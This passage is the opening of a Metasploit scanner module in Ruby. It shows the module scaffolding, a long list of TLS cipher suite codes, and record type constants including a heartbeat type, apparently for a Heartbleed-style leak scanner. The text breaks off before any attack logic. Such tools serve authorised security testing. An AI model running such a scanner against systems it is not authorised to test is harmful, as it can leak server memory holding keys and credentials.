##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  # All supported cipher suites are taken from
  # https://www.iana.org/assignments/tls-parameters/tls-parameters.xhtml
  CIPHER_SUITES = [
    0x0000, # TLS_NULL_WITH_NULL_NULL [RFC5246]
    0x0001, # TLS_RSA_WITH_NULL_MD5 [RFC5246]
    0x0002, # TLS_RSA_WITH_NULL_SHA [RFC5246]
    0x0003, # TLS_RSA_EXPORT_WITH_RC4_40_MD5, N,[RFC4346][RFC6347]
    0x0004, # TLS_RSA_WITH_RC4_128_MD5 [RFC5246][RFC6347]
    0x0005, # TLS_RSA_WITH_RC4_128_SHA [RFC5246][RFC6347]
    0x0006, # TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5 [RFC4346]
    0x0007, # TLS_RSA_WITH_IDEA_CBC_SHA [RFC5469]
    0x0008, # TLS_RSA_EXPORT_WITH_DES40_CBC_SHA [RFC4346]
    0x0009, # TLS_RSA_WITH_DES_CBC_SHA [RFC5469]
    0x000A, # TLS_RSA_WITH_3DES_EDE_CBC_SHA [RFC5246]
    0x000B, # TLS_DH_DSS_EXPORT_WITH_DES40_CBC_SHA [RFC4346]
    0x000C, # TLS_DH_DSS_WITH_DES_CBC_SHA [RFC5469]
    0x000D, # TLS_DH_DSS_WITH_3DES_EDE_CBC_SHA [RFC5246]
    0x000E, # TLS_DH_RSA_EXPORT_WITH_DES40_CBC_SHA [RFC4346]
    0x000F, # TLS_DH_RSA_WITH_DES_CBC_SHA [RFC5469]
    0x0010, # TLS_DH_RSA_WITH_3DES_EDE_CBC_SHA [RFC5246]
    0x0011, # TLS_DHE_DSS_EXPORT_WITH_DES40_CBC_SHA [RFC4346]
    0x0012, # TLS_DHE_DSS_WITH_DES_CBC_SHA [RFC5469]
    0x0013, # TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA [RFC5246]
    0x0014, # TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA [RFC4346]
    0x0015, # TLS_DHE_RSA_WITH_DES_CBC_SHA [RFC5469]
    0x0016, # TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA [RFC5246]
    0x0017, # TLS_DH_anon_EXPORT_WITH_RC4_40_MD5 [RFC4346][RFC6347]
    0x0018, # TLS_DH_anon_WITH_RC4_128_MD5 [RFC5246][RFC6347]
    0x0019, # TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA [RFC4346]
    0x001A, # TLS_DH_anon_WITH_DES_CBC_SHA [RFC5469]
    0x001B, # TLS_DH_anon_WITH_3DES_EDE_CBC_SHA [RFC5246]
    0x001E, # TLS_KRB5_WITH_DES_CBC_SHA [RFC2712]
    0x001F, # TLS_KRB5_WITH_3DES_EDE_CBC_SHA [RFC2712]
    0x0020, # TLS_KRB5_WITH_RC4_128_SHA [RFC2712][RFC6347]
    0x0021, # TLS_KRB5_WITH_IDEA_CBC_SHA [RFC2712]
    0x0022, # TLS_KRB5_WITH_DES_CBC_MD5 [RFC2712]
    0x0023, # TLS_KRB5_WITH_3DES_EDE_CBC_MD5 [RFC2712]
    0x0024, # TLS_KRB5_WITH_RC4_128_MD5 [RFC2712][RFC6347]
    0x0025, # TLS_KRB5_WITH_IDEA_CBC_MD5 [RFC2712]
    0x0026, # TLS_KRB5_EXPORT_WITH_DES_CBC_40_SHA [RFC2712]
    0x0027, # TLS_KRB5_EXPORT_WITH_RC2_CBC_40_SHA [RFC2712]
    0x0028, # TLS_KRB5_EXPORT_WITH_RC4_40_SHA [RFC2712][RFC6347]
    0x0029, # TLS_KRB5_EXPORT_WITH_DES_CBC_40_MD5 [RFC2712]
    0x002A, # TLS_KRB5_EXPORT_WITH_RC2_CBC_40_MD5 [RFC2712]
    0x002B, # TLS_KRB5_EXPORT_WITH_RC4_40_MD5 [RFC2712][RFC6347]
    0x002C, # TLS_PSK_WITH_NULL_SHA [RFC4785]
    0x002D, # TLS_DHE_PSK_WITH_NULL_SHA [RFC4785]
    0x002E, # TLS_RSA_PSK_WITH_NULL_SHA [RFC4785]
    0x002F, # TLS_RSA_WITH_AES_128_CBC_SHA [RFC5246]
    0x0030, # TLS_DH_DSS_WITH_AES_128_CBC_SHA [RFC5246]
    0x0031, # TLS_DH_RSA_WITH_AES_128_CBC_SHA [RFC5246]
    0x0032, # TLS_DHE_DSS_WITH_AES_128_CBC_SHA [RFC5246]
    0x0033, # TLS_DHE_RSA_WITH_AES_128_CBC_SHA [RFC5246]
    0x0034, # TLS_DH_anon_WITH_AES_128_CBC_SHA [RFC5246]
    0x0035, # TLS_RSA_WITH_AES_256_CBC_SHA [RFC5246]
    0x0036, # TLS_DH_DSS_WITH_AES_256_CBC_SHA [RFC5246]
    0x0037, # TLS_DH_RSA_WITH_AES_256_CBC_SHA [RFC5246]
    0x0038, # TLS_DHE_DSS_WITH_AES_256_CBC_SHA [RFC5246]
    0x0039, # TLS_DHE_RSA_WITH_AES_256_CBC_SHA [RFC5246]
    0x003A, # TLS_DH_anon_WITH_AES_256_CBC_SHA [RFC5246]
    0x003B, # TLS_RSA_WITH_NULL_SHA256 [RFC5246]
    0x003C, # TLS_RSA_WITH_AES_128_CBC_SHA256 [RFC5246]
    0x003D, # TLS_RSA_WITH_AES_256_CBC_SHA256 [RFC5246]
    0x003E, # TLS_DH_DSS_WITH_AES_128_CBC_SHA256 [RFC5246]
    0x003F, # TLS_DH_RSA_WITH_AES_128_CBC_SHA256 [RFC5246]
    0x0040, # TLS_DHE_DSS_WITH_AES_128_CBC_SHA256 [RFC5246]
    0x0041, # TLS_RSA_WITH_CAMELLIA_128_CBC_SHA [RFC5932]
    0x0042, # TLS_DH_DSS_WITH_CAMELLIA_128_CBC_SHA [RFC5932]
    0x0043, # TLS_DH_RSA_WITH_CAMELLIA_128_CBC_SHA [RFC5932]
    0x0044, # TLS_DHE_DSS_WITH_CAMELLIA_128_CBC_SHA [RFC5932]
    0x0045, # TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA [RFC5932]
    0x0046, # TLS_DH_anon_WITH_CAMELLIA_128_CBC_SHA [RFC5932]
    0x0067, # TLS_DHE_RSA_WITH_AES_128_CBC_SHA256 [RFC5246]
    0x0068, # TLS_DH_DSS_WITH_AES_256_CBC_SHA256 [RFC5246]
    0x0069, # TLS_DH_RSA_WITH_AES_256_CBC_SHA256 [RFC5246]
    0x006A, # TLS_DHE_DSS_WITH_AES_256_CBC_SHA256 [RFC5246]
    0x006B, # TLS_DHE_RSA_WITH_AES_256_CBC_SHA256 [RFC5246]
    0x006C, # TLS_DH_anon_WITH_AES_128_CBC_SHA256 [RFC5246]
    0x006D, # TLS_DH_anon_WITH_AES_256_CBC_SHA256 [RFC5246]
    0x0084, # TLS_RSA_WITH_CAMELLIA_256_CBC_SHA [RFC5932]
    0x0085, # TLS_DH_DSS_WITH_CAMELLIA_256_CBC_SHA [RFC5932]
    0x0086, # TLS_DH_RSA_WITH_CAMELLIA_256_CBC_SHA [RFC5932]
    0x0087, # TLS_DHE_DSS_WITH_CAMELLIA_256_CBC_SHA [RFC5932]
    0x0088, # TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA [RFC5932]
    0x0089, # TLS_DH_anon_WITH_CAMELLIA_256_CBC_SHA [RFC5932]
    0x008A, # TLS_PSK_WITH_RC4_128_SHA [RFC4279][RFC6347]
    0x008B, # TLS_PSK_WITH_3DES_EDE_CBC_SHA [RFC4279]
    0x008C, # TLS_PSK_WITH_AES_128_CBC_SHA [RFC4279]
    0x008D, # TLS_PSK_WITH_AES_256_CBC_SHA [RFC4279]
    0x008E, # TLS_DHE_PSK_WITH_RC4_128_SHA [RFC4279][RFC6347]
    0x008F, # TLS_DHE_PSK_WITH_3DES_EDE_CBC_SHA [RFC4279]
    0x0090, # TLS_DHE_PSK_WITH_AES_128_CBC_SHA [RFC4279]
    0x0091, # TLS_DHE_PSK_WITH_AES_256_CBC_SHA [RFC4279]
    0x0092, # TLS_RSA_PSK_WITH_RC4_128_SHA [RFC4279][RFC6347]
    0x0093, # TLS_RSA_PSK_WITH_3DES_EDE_CBC_SHA [RFC4279]
    0x0094, # TLS_RSA_PSK_WITH_AES_128_CBC_SHA [RFC4279]
    0x0095, # TLS_RSA_PSK_WITH_AES_256_CBC_SHA [RFC4279]
    0x0096, # TLS_RSA_WITH_SEED_CBC_SHA [RFC4162]
    0x0097, # TLS_DH_DSS_WITH_SEED_CBC_SHA [RFC4162]
    0x0098, # TLS_DH_RSA_WITH_SEED_CBC_SHA [RFC4162]
    0x0099, # TLS_DHE_DSS_WITH_SEED_CBC_SHA [RFC4162]
    0x009A, # TLS_DHE_RSA_WITH_SEED_CBC_SHA [RFC4162]
    0x009B, # TLS_DH_anon_WITH_SEED_CBC_SHA [RFC4162]
    0x009C, # TLS_RSA_WITH_AES_128_GCM_SHA256 [RFC5288]
    0x009D, # TLS_RSA_WITH_AES_256_GCM_SHA384 [RFC5288]
    0x009E, # TLS_DHE_RSA_WITH_AES_128_GCM_SHA256 [RFC5288]
    0x009F, # TLS_DHE_RSA_WITH_AES_256_GCM_SHA384 [RFC5288]
    0x00A0, # TLS_DH_RSA_WITH_AES_128_GCM_SHA256 [RFC5288]
    0x00A1, # TLS_DH_RSA_WITH_AES_256_GCM_SHA384 [RFC5288]
    0x00A2, # TLS_DHE_DSS_WITH_AES_128_GCM_SHA256 [RFC5288]
    0x00A3, # TLS_DHE_DSS_WITH_AES_256_GCM_SHA384 [RFC5288]
    0x00A4, # TLS_DH_DSS_WITH_AES_128_GCM_SHA256 [RFC5288]
    0x00A5, # TLS_DH_DSS_WITH_AES_256_GCM_SHA384 [RFC5288]
    0x00A6, # TLS_DH_anon_WITH_AES_128_GCM_SHA256 [RFC5288]
    0x00A7, # TLS_DH_anon_WITH_AES_256_GCM_SHA384 [RFC5288]
    0x00A8, # TLS_PSK_WITH_AES_128_GCM_SHA256 [RFC5487]
    0x00A9, # TLS_PSK_WITH_AES_256_GCM_SHA384 [RFC5487]
    0x00AA, # TLS_DHE_PSK_WITH_AES_128_GCM_SHA256 [RFC5487]
    0x00AB, # TLS_DHE_PSK_WITH_AES_256_GCM_SHA384 [RFC5487]
    0x00AC, # TLS_RSA_PSK_WITH_AES_128_GCM_SHA256 [RFC5487]
    0x00AD, # TLS_RSA_PSK_WITH_AES_256_GCM_SHA384 [RFC5487]
    0x00AE, # TLS_PSK_WITH_AES_128_CBC_SHA256 [RFC5487]
    0x00AF, # TLS_PSK_WITH_AES_256_CBC_SHA384 [RFC5487]
    0x00B0, # TLS_PSK_WITH_NULL_SHA256 [RFC5487]
    0x00B1, # TLS_PSK_WITH_NULL_SHA384 [RFC5487]
    0x00B2, # TLS_DHE_PSK_WITH_AES_128_CBC_SHA256 [RFC5487]
    0x00B3, # TLS_DHE_PSK_WITH_AES_256_CBC_SHA384 [RFC5487]
    0x00B4, # TLS_DHE_PSK_WITH_NULL_SHA256 [RFC5487]
    0x00B5, # TLS_DHE_PSK_WITH_NULL_SHA384 [RFC5487]
    0x00B6, # TLS_RSA_PSK_WITH_AES_128_CBC_SHA256 [RFC5487]
    0x00B7, # TLS_RSA_PSK_WITH_AES_256_CBC_SHA384 [RFC5487]
    0x00B8, # TLS_RSA_PSK_WITH_NULL_SHA256 [RFC5487]
    0x00B9, # TLS_RSA_PSK_WITH_NULL_SHA384 [RFC5487]
    0x00BA, # TLS_RSA_WITH_CAMELLIA_128_CBC_SHA256 [RFC5932]
    0x00BB, # TLS_DH_DSS_WITH_CAMELLIA_128_CBC_SHA256 [RFC5932]
    0x00BC, # TLS_DH_RSA_WITH_CAMELLIA_128_CBC_SHA256 [RFC5932]
    0x00BD, # TLS_DHE_DSS_WITH_CAMELLIA_128_CBC_SHA256 [RFC5932]
    0x00BE, # TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA256 [RFC5932]
    0x00BF, # TLS_DH_anon_WITH_CAMELLIA_128_CBC_SHA256 [RFC5932]
    0x00C0, # TLS_RSA_WITH_CAMELLIA_256_CBC_SHA256 [RFC5932]
    0x00C1, # TLS_DH_DSS_WITH_CAMELLIA_256_CBC_SHA256 [RFC5932]
    0x00C2, # TLS_DH_RSA_WITH_CAMELLIA_256_CBC_SHA256 [RFC5932]
    0x00C3, # TLS_DHE_DSS_WITH_CAMELLIA_256_CBC_SHA256 [RFC5932]
    0x00C4, # TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA256 [RFC5932]
    0x00C5, # TLS_DH_anon_WITH_CAMELLIA_256_CBC_SHA256 [RFC5932]
    0x00FF, # TLS_EMPTY_RENEGOTIATION_INFO_SCSV [RFC5746]
    0xC001, # TLS_ECDH_ECDSA_WITH_NULL_SHA [RFC4492]
    0xC002, # TLS_ECDH_ECDSA_WITH_RC4_128_SHA [RFC4492][RFC6347]
    0xC003, # TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA [RFC4492]
    0xC004, # TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA [RFC4492]
    0xC005, # TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA [RFC4492]
    0xC006, # TLS_ECDHE_ECDSA_WITH_NULL_SHA [RFC4492]
    0xC007, # TLS_ECDHE_ECDSA_WITH_RC4_128_SHA [RFC4492][RFC6347]
    0xC008, # TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA [RFC4492]
    0xC009, # TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA [RFC4492]
    0xC00A, # TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA [RFC4492]
    0xC00B, # TLS_ECDH_RSA_WITH_NULL_SHA [RFC4492]
    0xC00C, # TLS_ECDH_RSA_WITH_RC4_128_SHA [RFC4492][RFC6347]
    0xC00D, # TLS_ECDH_RSA_WITH_3DES_EDE_CBC_SHA [RFC4492]
    0xC00E, # TLS_ECDH_RSA_WITH_AES_128_CBC_SHA [RFC4492]
    0xC00F, # TLS_ECDH_RSA_WITH_AES_256_CBC_SHA [RFC4492]
    0xC010, # TLS_ECDHE_RSA_WITH_NULL_SHA [RFC4492]
    0xC011, # TLS_ECDHE_RSA_WITH_RC4_128_SHA [RFC4492][RFC6347]
    0xC012, # TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA [RFC4492]
    0xC013, # TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA [RFC4492]
    0xC014, # TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA [RFC4492]
    0xC015, # TLS_ECDH_anon_WITH_NULL_SHA [RFC4492]
    0xC016, # TLS_ECDH_anon_WITH_RC4_128_SHA [RFC4492][RFC6347]
    0xC017, # TLS_ECDH_anon_WITH_3DES_EDE_CBC_SHA [RFC4492]
    0xC018, # TLS_ECDH_anon_WITH_AES_128_CBC_SHA [RFC4492]
    0xC019, # TLS_ECDH_anon_WITH_AES_256_CBC_SHA [RFC4492]
    0xC01A, # TLS_SRP_SHA_WITH_3DES_EDE_CBC_SHA [RFC5054]
    0xC01B, # TLS_SRP_SHA_RSA_WITH_3DES_EDE_CBC_SHA [RFC5054]
    0xC01C, # TLS_SRP_SHA_DSS_WITH_3DES_EDE_CBC_SHA [RFC5054]
    0xC01D, # TLS_SRP_SHA_WITH_AES_128_CBC_SHA [RFC5054]
    0xC01E, # TLS_SRP_SHA_RSA_WITH_AES_128_CBC_SHA [RFC5054]
    0xC01F, # TLS_SRP_SHA_DSS_WITH_AES_128_CBC_SHA [RFC5054]
    0xC020, # TLS_SRP_SHA_WITH_AES_256_CBC_SHA [RFC5054]
    0xC021, # TLS_SRP_SHA_RSA_WITH_AES_256_CBC_SHA [RFC5054]
    0xC022, # TLS_SRP_SHA_DSS_WITH_AES_256_CBC_SHA [RFC5054]
    0xC023, # TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256 [RFC5289]
    0xC024, # TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384 [RFC5289]
    0xC025, # TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA256 [RFC5289]
    0xC026, # TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA384 [RFC5289]
    0xC027, # TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256 [RFC5289]
    0xC028, # TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384 [RFC5289]
    0xC029, # TLS_ECDH_RSA_WITH_AES_128_CBC_SHA256 [RFC5289]
    0xC02A, # TLS_ECDH_RSA_WITH_AES_256_CBC_SHA384 [RFC5289]
    0xC02B, # TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256 [RFC5289]
    0xC02C, # TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384 [RFC5289]
    0xC02D, # TLS_ECDH_ECDSA_WITH_AES_128_GCM_SHA256 [RFC5289]
    0xC02E, # TLS_ECDH_ECDSA_WITH_AES_256_GCM_SHA384 [RFC5289]
    0xC02F, # TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 [RFC5289]
    0xC030, # TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 [RFC5289]
    0xC031, # TLS_ECDH_RSA_WITH_AES_128_GCM_SHA256 [RFC5289]
    0xC032, # TLS_ECDH_RSA_WITH_AES_256_GCM_SHA384 [RFC5289]
    0xC033, # TLS_ECDHE_PSK_WITH_RC4_128_SHA [RFC5489][RFC6347]
    0xC034, # TLS_ECDHE_PSK_WITH_3DES_EDE_CBC_SHA [RFC5489]
    0xC035, # TLS_ECDHE_PSK_WITH_AES_128_CBC_SHA [RFC5489]
    0xC036, # TLS_ECDHE_PSK_WITH_AES_256_CBC_SHA [RFC5489]
    0xC037, # TLS_ECDHE_PSK_WITH_AES_128_CBC_SHA256 [RFC5489]
    0xC038, # TLS_ECDHE_PSK_WITH_AES_256_CBC_SHA384 [RFC5489]
    0xC039, # TLS_ECDHE_PSK_WITH_NULL_SHA [RFC5489]
    0xC03A, # TLS_ECDHE_PSK_WITH_NULL_SHA256 [RFC5489]
    0xC03B, # TLS_ECDHE_PSK_WITH_NULL_SHA384 [RFC5489]
    0xC03C, # TLS_RSA_WITH_ARIA_128_CBC_SHA256 [RFC6209]
    0xC03D, # TLS_RSA_WITH_ARIA_256_CBC_SHA384 [RFC6209]
    0xC03E, # TLS_DH_DSS_WITH_ARIA_128_CBC_SHA256 [RFC6209]
    0xC03F, # TLS_DH_DSS_WITH_ARIA_256_CBC_SHA384 [RFC6209]
    0xC040, # TLS_DH_RSA_WITH_ARIA_128_CBC_SHA256 [RFC6209]
    0xC041, # TLS_DH_RSA_WITH_ARIA_256_CBC_SHA384 [RFC6209]
    0xC042, # TLS_DHE_DSS_WITH_ARIA_128_CBC_SHA256 [RFC6209]
    0xC043, # TLS_DHE_DSS_WITH_ARIA_256_CBC_SHA384 [RFC6209]
    0xC044, # TLS_DHE_RSA_WITH_ARIA_128_CBC_SHA256 [RFC6209]
    0xC045, # TLS_DHE_RSA_WITH_ARIA_256_CBC_SHA384 [RFC6209]
    0xC046, # TLS_DH_anon_WITH_ARIA_128_CBC_SHA256 [RFC6209]
    0xC047, # TLS_DH_anon_WITH_ARIA_256_CBC_SHA384 [RFC6209]
    0xC048, # TLS_ECDHE_ECDSA_WITH_ARIA_128_CBC_SHA256 [RFC6209]
    0xC049, # TLS_ECDHE_ECDSA_WITH_ARIA_256_CBC_SHA384 [RFC6209]
    0xC04A, # TLS_ECDH_ECDSA_WITH_ARIA_128_CBC_SHA256 [RFC6209]
    0xC04B, # TLS_ECDH_ECDSA_WITH_ARIA_256_CBC_SHA384 [RFC6209]
    0xC04C, # TLS_ECDHE_RSA_WITH_ARIA_128_CBC_SHA256 [RFC6209]
    0xC04D, # TLS_ECDHE_RSA_WITH_ARIA_256_CBC_SHA384 [RFC6209]
    0xC04E, # TLS_ECDH_RSA_WITH_ARIA_128_CBC_SHA256 [RFC6209]
    0xC04F, # TLS_ECDH_RSA_WITH_ARIA_256_CBC_SHA384 [RFC6209]
    0xC050, # TLS_RSA_WITH_ARIA_128_GCM_SHA256 [RFC6209]
    0xC051, # TLS_RSA_WITH_ARIA_256_GCM_SHA384 [RFC6209]
    0xC052, # TLS_DHE_RSA_WITH_ARIA_128_GCM_SHA256 [RFC6209]
    0xC053, # TLS_DHE_RSA_WITH_ARIA_256_GCM_SHA384 [RFC6209]
    0xC054, # TLS_DH_RSA_WITH_ARIA_128_GCM_SHA256 [RFC6209]
    0xC055, # TLS_DH_RSA_WITH_ARIA_256_GCM_SHA384 [RFC6209]
    0xC056, # TLS_DHE_DSS_WITH_ARIA_128_GCM_SHA256 [RFC6209]
    0xC057, # TLS_DHE_DSS_WITH_ARIA_256_GCM_SHA384 [RFC6209]
    0xC058, # TLS_DH_DSS_WITH_ARIA_128_GCM_SHA256 [RFC6209]
    0xC059, # TLS_DH_DSS_WITH_ARIA_256_GCM_SHA384 [RFC6209]
    0xC05A, # TLS_DH_anon_WITH_ARIA_128_GCM_SHA256 [RFC6209]
    0xC05B, # TLS_DH_anon_WITH_ARIA_256_GCM_SHA384 [RFC6209]
    0xC05C, # TLS_ECDHE_ECDSA_WITH_ARIA_128_GCM_SHA256 [RFC6209]
    0xC05D, # TLS_ECDHE_ECDSA_WITH_ARIA_256_GCM_SHA384 [RFC6209]
    0xC05E, # TLS_ECDH_ECDSA_WITH_ARIA_128_GCM_SHA256 [RFC6209]
    0xC05F, # TLS_ECDH_ECDSA_WITH_ARIA_256_GCM_SHA384 [RFC6209]
    0xC060, # TLS_ECDHE_RSA_WITH_ARIA_128_GCM_SHA256 [RFC6209]
    0xC061, # TLS_ECDHE_RSA_WITH_ARIA_256_GCM_SHA384 [RFC6209]
    0xC062, # TLS_ECDH_RSA_WITH_ARIA_128_GCM_SHA256 [RFC6209]
    0xC063, # TLS_ECDH_RSA_WITH_ARIA_256_GCM_SHA384 [RFC6209]
    0xC064, # TLS_PSK_WITH_ARIA_128_CBC_SHA256 [RFC6209]
    0xC065, # TLS_PSK_WITH_ARIA_256_CBC_SHA384 [RFC6209]
    0xC066, # TLS_DHE_PSK_WITH_ARIA_128_CBC_SHA256 [RFC6209]
    0xC067, # TLS_DHE_PSK_WITH_ARIA_256_CBC_SHA384 [RFC6209]
    0xC068, # TLS_RSA_PSK_WITH_ARIA_128_CBC_SHA256 [RFC6209]
    0xC069, # TLS_RSA_PSK_WITH_ARIA_256_CBC_SHA384 [RFC6209]
    0xC06A, # TLS_PSK_WITH_ARIA_128_GCM_SHA256 [RFC6209]
    0xC06B, # TLS_PSK_WITH_ARIA_256_GCM_SHA384 [RFC6209]
    0xC06C, # TLS_DHE_PSK_WITH_ARIA_128_GCM_SHA256 [RFC6209]
    0xC06D, # TLS_DHE_PSK_WITH_ARIA_256_GCM_SHA384 [RFC6209]
    0xC06E, # TLS_RSA_PSK_WITH_ARIA_128_GCM_SHA256 [RFC6209]
    0xC06F, # TLS_RSA_PSK_WITH_ARIA_256_GCM_SHA384 [RFC6209]
    0xC070, # TLS_ECDHE_PSK_WITH_ARIA_128_CBC_SHA256 [RFC6209]
    0xC071, # TLS_ECDHE_PSK_WITH_ARIA_256_CBC_SHA384 [RFC6209]
    0xC072, # TLS_ECDHE_ECDSA_WITH_CAMELLIA_128_CBC_SHA256 [RFC6367]
    0xC073, # TLS_ECDHE_ECDSA_WITH_CAMELLIA_256_CBC_SHA384 [RFC6367]
    0xC074, # TLS_ECDH_ECDSA_WITH_CAMELLIA_128_CBC_SHA256 [RFC6367]
    0xC075, # TLS_ECDH_ECDSA_WITH_CAMELLIA_256_CBC_SHA384 [RFC6367]
    0xC076, # TLS_ECDHE_RSA_WITH_CAMELLIA_128_CBC_SHA256 [RFC6367]
    0xC077, # TLS_ECDHE_RSA_WITH_CAMELLIA_256_CBC_SHA384 [RFC6367]
    0xC078, # TLS_ECDH_RSA_WITH_CAMELLIA_128_CBC_SHA256 [RFC6367]
    0xC079, # TLS_ECDH_RSA_WITH_CAMELLIA_256_CBC_SHA384 [RFC6367]
    0xC07A, # TLS_RSA_WITH_CAMELLIA_128_GCM_SHA256 [RFC6367]
    0xC07B, # TLS_RSA_WITH_CAMELLIA_256_GCM_SHA384 [RFC6367]
    0xC07C, # TLS_DHE_RSA_WITH_CAMELLIA_128_GCM_SHA256 [RFC6367]
    0xC07D, # TLS_DHE_RSA_WITH_CAMELLIA_256_GCM_SHA384 [RFC6367]
    0xC07E, # TLS_DH_RSA_WITH_CAMELLIA_128_GCM_SHA256 [RFC6367]
    0xC07F, # TLS_DH_RSA_WITH_CAMELLIA_256_GCM_SHA384 [RFC6367]
    0xC080, # TLS_DHE_DSS_WITH_CAMELLIA_128_GCM_SHA256 [RFC6367]
    0xC081, # TLS_DHE_DSS_WITH_CAMELLIA_256_GCM_SHA384 [RFC6367]
    0xC082, # TLS_DH_DSS_WITH_CAMELLIA_128_GCM_SHA256 [RFC6367]
    0xC083, # TLS_DH_DSS_WITH_CAMELLIA_256_GCM_SHA384 [RFC6367]
    0xC084, # TLS_DH_anon_WITH_CAMELLIA_128_GCM_SHA256 [RFC6367]
    0xC085, # TLS_DH_anon_WITH_CAMELLIA_256_GCM_SHA384 [RFC6367]
    0xC086, # TLS_ECDHE_ECDSA_WITH_CAMELLIA_128_GCM_SHA256 [RFC6367]
    0xC087, # TLS_ECDHE_ECDSA_WITH_CAMELLIA_256_GCM_SHA384 [RFC6367]
    0xC088, # TLS_ECDH_ECDSA_WITH_CAMELLIA_128_GCM_SHA256 [RFC6367]
    0xC089, # TLS_ECDH_ECDSA_WITH_CAMELLIA_256_GCM_SHA384 [RFC6367]
    0xC08A, # TLS_ECDHE_RSA_WITH_CAMELLIA_128_GCM_SHA256 [RFC6367]
    0xC08B, # TLS_ECDHE_RSA_WITH_CAMELLIA_256_GCM_SHA384 [RFC6367]
    0xC08C, # TLS_ECDH_RSA_WITH_CAMELLIA_128_GCM_SHA256 [RFC6367]
    0xC08D, # TLS_ECDH_RSA_WITH_CAMELLIA_256_GCM_SHA384 [RFC6367]
    0xC08E, # TLS_PSK_WITH_CAMELLIA_128_GCM_SHA256 [RFC6367]
    0xC08F, # TLS_PSK_WITH_CAMELLIA_256_GCM_SHA384 [RFC6367]
    0xC090, # TLS_DHE_PSK_WITH_CAMELLIA_128_GCM_SHA256 [RFC6367]
    0xC091, # TLS_DHE_PSK_WITH_CAMELLIA_256_GCM_SHA384 [RFC6367]
    0xC092, # TLS_RSA_PSK_WITH_CAMELLIA_128_GCM_SHA256 [RFC6367]
    0xC093, # TLS_RSA_PSK_WITH_CAMELLIA_256_GCM_SHA384 [RFC6367]
    0xC094, # TLS_PSK_WITH_CAMELLIA_128_CBC_SHA256 [RFC6367]
    0xC095, # TLS_PSK_WITH_CAMELLIA_256_CBC_SHA384 [RFC6367]
    0xC096, # TLS_DHE_PSK_WITH_CAMELLIA_128_CBC_SHA256 [RFC6367]
    0xC097, # TLS_DHE_PSK_WITH_CAMELLIA_256_CBC_SHA384 [RFC6367]
    0xC098, # TLS_RSA_PSK_WITH_CAMELLIA_128_CBC_SHA256 [RFC6367]
    0xC099, # TLS_RSA_PSK_WITH_CAMELLIA_256_CBC_SHA384 [RFC6367]
    0xC09A, # TLS_ECDHE_PSK_WITH_CAMELLIA_128_CBC_SHA256 [RFC6367]
    0xC09B, # TLS_ECDHE_PSK_WITH_CAMELLIA_256_CBC_SHA384 [RFC6367]
    0xC09C, # TLS_RSA_WITH_AES_128_CCM [RFC6655]
    0xC09D, # TLS_RSA_WITH_AES_256_CCM [RFC6655]
    0xC09E, # TLS_DHE_RSA_WITH_AES_128_CCM [RFC6655]
    0xC09F, # TLS_DHE_RSA_WITH_AES_256_CCM [RFC6655]
    0xC0A0, # TLS_RSA_WITH_AES_128_CCM_8 [RFC6655]
    0xC0A1, # TLS_RSA_WITH_AES_256_CCM_8 [RFC6655]
    0xC0A2, # TLS_DHE_RSA_WITH_AES_128_CCM_8 [RFC6655]
    0xC0A3, # TLS_DHE_RSA_WITH_AES_256_CCM_8 [RFC6655]
    0xC0A4, # TLS_PSK_WITH_AES_128_CCM [RFC6655]
    0xC0A5, # TLS_PSK_WITH_AES_256_CCM [RFC6655]
    0xC0A6, # TLS_DHE_PSK_WITH_AES_128_CCM [RFC6655]
    0xC0A7, # TLS_DHE_PSK_WITH_AES_256_CCM [RFC6655]
    0xC0A8, # TLS_PSK_WITH_AES_128_CCM_8 [RFC6655]
    0xC0A9, # TLS_PSK_WITH_AES_256_CCM_8 [RFC6655]
    0xC0AA, # TLS_PSK_DHE_WITH_AES_128_CCM_8 [RFC6655]
    0xC0AB, # TLS_PSK_DHE_WITH_AES_256_CCM_8 [RFC6655]
    0xC0AC, # TLS_ECDHE_ECDSA_WITH_AES_128_CCM [RFC-mcgrew-tls-aes-ccm-ecc-08]
    0xC0AD, # TLS_ECDHE_ECDSA_WITH_AES_256_CCM [RFC-mcgrew-tls-aes-ccm-ecc-08]
    0xC0AE, # TLS_ECDHE_ECDSA_WITH_AES_128_CCM_8 [RFC-mcgrew-tls-aes-ccm-ecc-08]
    0xC0AF  # TLS_ECDHE_ECDSA_WITH_AES_256_CCM_8 [RFC-mcgrew-tls-aes-ccm-ecc-08]
  ]

  HANDSHAKE_RECORD_TYPE = 0x16
  HEARTBEAT_RECORD_TYPE = 0x18
  ALERT_RECORD_TYPE     = 0x15
  TLS_VERSION = {
    'SSLv3' => 0x0300,
    '1.0'   => 0x0301,
    '1.1'   => 0x0302,
    '1.2'   => 0x0303
  }

  TLS_CALLBACKS = {
    'SMTP'   => :tls_smtp,
    'IMAP'   => :tls_imap,
